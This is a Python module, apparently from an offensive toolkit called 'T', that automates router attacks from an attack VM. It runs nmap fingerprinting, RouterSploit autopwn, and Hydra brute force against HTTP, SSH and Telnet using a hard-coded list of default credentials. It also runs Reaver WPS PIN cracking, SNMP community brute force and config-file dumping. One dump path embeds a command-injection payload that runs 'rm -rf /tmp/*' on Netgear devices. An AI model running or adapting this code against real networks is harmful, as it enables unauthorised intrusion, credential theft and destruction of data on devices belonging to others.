"""
Router & network infrastructure exploitation module for T.
All commands execute on the attack VM via vm_bridge.
"""

from typing import AsyncIterator
from offensive.vm_bridge import vm
from core.logger import get_logger

log = get_logger("devices.router")


# ── Common router default credentials (vendor-mapped) ─────────────────────────

DEFAULT_CREDS = [
    ("admin", "admin"), ("admin", "password"), ("admin", ""),
    ("admin", "1234"), ("admin", "12345"), ("admin", "123456"),
    ("root", "root"), ("root", "admin"), ("root", ""),
    ("admin", "admin123"), ("user", "user"), ("support", "support"),
    ("guest", "guest"), ("admin", "pass"), ("Administrator", "admin"),
]


# ── Router fingerprint ────────────────────────────────────────────────────────

async def fingerprint(target: str) -> AsyncIterator[str]:
    """Nmap service + script scan focused on router ports."""
    cmd = (
        f"nmap -sV -sC -T4 -p 22,23,80,443,8080,8443,161,8888,8181 "
        f"--script 'http-title,http-server-header,snmp-info,ssh-auth-methods' "
        f"{target}"
    )
    async for line in vm.run(cmd, timeout=120):
        yield line


# ── RouterSploit autopwn ──────────────────────────────────────────────────────

async def autopwn(target: str) -> AsyncIterator[str]:
    """RouterSploit autopwn — auto-matches device to known exploits."""
    cmd = (
        f"python3 -c \""
        f"from routersploit.modules.scanners import autopwn; "
        f"r = autopwn.Exploit(); r.target = '{target}'; r.run()"
        f"\""
    )
    async for line in vm.run(cmd, timeout=300):
        yield line


# ── Default credential attack ─────────────────────────────────────────────────

async def try_default_creds(target: str, port: int = 80, https: bool = False) -> AsyncIterator[str]:
    """
    Try common router default credentials against HTTP admin panel.
    Uses Hydra with a built-in credential list.
    """
    proto = "https" if https else "http"
    # Write cred list to VM then run hydra
    cred_lines = "\\n".join(f"{u}:{p}" for u, p in DEFAULT_CREDS)
    cmd = (
        f"printf '{cred_lines}\\n' > /tmp/router_creds.txt && "
        f"hydra -C /tmp/router_creds.txt {proto}-get://{target}:{port}/ -t 4 -q"
    )
    async for line in vm.run(cmd, timeout=120):
        yield line


# ── Admin panel brute force ───────────────────────────────────────────────────

async def brute_http(target: str, port: int, user: str, wordlist: str,
                     form_path: str = "/", user_field: str = "username",
                     pass_field: str = "password") -> AsyncIterator[str]:
    """HTTP form-based login brute force via Hydra."""
    cmd = (
        f"hydra -l {user} -P {wordlist} "
        f"{target} http-post-form "
        f"'{form_path}:{user_field}=^USER^&{pass_field}=^PASS^:F=incorrect' "
        f"-t 4 -q"
    )
    async for line in vm.run(cmd, timeout=300):
        yield line


# ── SSH / Telnet brute force ──────────────────────────────────────────────────

async def brute_ssh(target: str, user: str, wordlist: str) -> AsyncIterator[str]:
    cmd = f"hydra -l {user} -P {wordlist} ssh://{target} -t 4 -q"
    async for line in vm.run(cmd, timeout=300):
        yield line


async def brute_telnet(target: str, user: str, wordlist: str) -> AsyncIterator[str]:
    cmd = f"hydra -l {user} -P {wordlist} telnet://{target} -t 4 -q"
    async for line in vm.run(cmd, timeout=300):
        yield line


# ── WPS attack ────────────────────────────────────────────────────────────────

async def wps_attack(interface: str, bssid: str) -> AsyncIterator[str]:
    """Reaver WPS PIN brute force → recovers WPA passphrase."""
    cmd = f"sudo reaver -i {interface}mon -b {bssid} -vv -K 1"
    async for line in vm.run(cmd, timeout=600):
        yield line


# ── SNMP enumeration ──────────────────────────────────────────────────────────

async def snmp_enum(target: str, community: str = "public") -> AsyncIterator[str]:
    """SNMP walk — reads full device MIB: users, interfaces, routes."""
    cmd = f"snmpwalk -v2c -c {community} {target}"
    async for line in vm.run(cmd, timeout=60):
        yield line


async def snmp_brute(target: str) -> AsyncIterator[str]:
    """Brute force SNMP community strings."""
    cmd = f"onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt {target}"
    async for line in vm.run(cmd, timeout=60):
        yield line


# ── Config dump ───────────────────────────────────────────────────────────────

async def dump_config(target: str, port: int = 80, path: str = "/backup.cfg") -> AsyncIterator[str]:
    """Try common config backup endpoints."""
    paths = [
        "/backup.cfg", "/config.bin", "/router_config.cfg",
        "/admin/config.bin", "/cgi-bin/export_config.sh",
        "/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*",
    ]
    for p in paths:
        cmd = f"curl -sk --connect-timeout 5 http://{target}:{port}{p} | head -50"
        yield f"[trying] {p}"
        async for line in vm.run(cmd, timeout=15):
            yield line


# ── UPnP enumeration ──────────────────────────────────────────────────────────

async def upnp_enum(target: str) -> AsyncIterator[str]:
    """Discover and enumerate UPnP services."""
    cmd = f"nmap -sU -p 1900 --script upnp-info {target}"
    async for line in vm.run(cmd, timeout=60):
        yield line


# ── Full router audit pipeline ────────────────────────────────────────────────

async def full_audit(target: str) -> AsyncIterator[str]:
    """
    One-shot router audit:
    fingerprint → default creds → SNMP → UPnP → RouterSploit
    """
    yield f"[T] Starting full router audit on {target}"
    yield "─" * 50

    yield "[1/5] Fingerprinting open ports and services..."
    async for line in fingerprint(target):
        yield line

    yield "\n[2/5] Trying default credentials..."
    async for line in try_default_creds(target):
        yield line

    yield "\n[3/5] SNMP community brute force..."
    async for line in snmp_brute(target):
        yield line

    yield "\n[4/5] UPnP enumeration..."
    async for line in upnp_enum(target):
        yield line

    yield "\n[5/5] RouterSploit autopwn..."
    async for line in autopwn(target):
        yield line

    yield "\n[T] Audit complete."
